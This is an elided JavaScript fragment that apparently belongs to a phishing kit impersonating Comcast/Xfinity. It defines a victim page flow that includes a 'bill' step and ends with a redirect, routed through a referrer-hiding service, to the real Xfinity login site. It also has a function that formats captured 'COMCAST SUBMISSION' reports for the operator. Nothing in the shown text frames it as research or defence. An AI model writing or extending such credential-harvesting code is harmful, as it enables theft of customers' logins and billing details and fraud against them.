...
const DEFAULT_PAGEFLOW = {
    ...
    "3": { page: "bill", enabled: true },
    "4": { page: "final", enabled: true }
  };
...
const routeMap = {
  ...
  final: "https://href.li/?https://connect.xfinity.com"
};
...
async function buildMessage(data, options = {}) {
  ...
  try {
    ...
    if (hasEmailOrUsername) {
      heading = `👤 COMCAST NEW USER SUBMISSION`;
    } else {
      const display = identifier || userId;
      heading = `👤 COMCAST SUBMISSION\n\n USER: @${display}`;
    }
